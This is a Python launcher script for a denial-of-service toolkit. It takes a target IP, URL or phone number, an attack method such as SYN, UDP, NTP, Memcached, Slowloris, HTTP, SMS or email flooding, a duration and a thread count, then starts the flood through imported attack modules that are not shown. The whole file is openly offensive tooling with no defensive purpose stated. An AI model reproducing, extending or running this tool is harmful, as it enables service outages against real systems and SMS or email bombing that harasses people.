# Created by LimerBoy
# Modified by Vinny
# Import modules
import os
import sys
import argparse

# Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

# Parse args
parser = argparse.ArgumentParser(description="Denial-of-service ToolKit")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Target ip:port, url or phone",
)

# Method argument
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP/CUSTOM>",
    help="Attack method",
)

# Time argument
parser.add_argument(
    "--time", type=int, default=10, metavar="<time>", help="time in secounds"
)

# Threads argument
parser.add_argument(
    "--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
)

#  Cookie argument (optional)
parser.add_argument(
    "--cookies", type=str, metavar="<cookies>", help="cookies"
)

#  User-agent argument (optional)
parser.add_argument(
    "--user-agent", type=str, metavar="<user-agent>", help="user-agent"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target
cookies = args.cookies
user_agent = args.user_agent


if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target, cookies=cookies, user_agent=user_agent
    ) as Flood:
        Flood.Start()
